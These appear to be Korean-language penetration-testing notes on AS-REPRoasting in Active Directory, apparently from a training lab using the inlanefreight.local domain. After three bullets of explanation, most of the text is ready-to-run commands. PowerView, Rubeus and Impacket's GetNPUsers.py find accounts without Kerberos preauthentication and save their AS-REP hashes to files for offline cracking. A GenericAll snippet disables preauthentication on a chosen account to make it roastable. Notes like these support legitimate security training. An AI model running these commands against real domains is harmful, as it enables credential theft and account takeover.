## AS-REPRoasting
- 사전인증 비활성화 계정은 `Authenticator`를 KDC에 제공할 필요가 없어진다.
- 유저명으로 `AS-REQ`를 요청하면 인증 없이도 `AS-REP`응답을 받게 된다.
- 응답에 포함된 데이터를 통해서 크래킹 시도.

### Windows
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```
```powershell
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
```

### Linux
```bash
GetNPUsers.py inlanefreight.local/pixis -request

GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
```

#### GenericAll
```powershell
Import-Module .\PowerView.ps1

Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
```
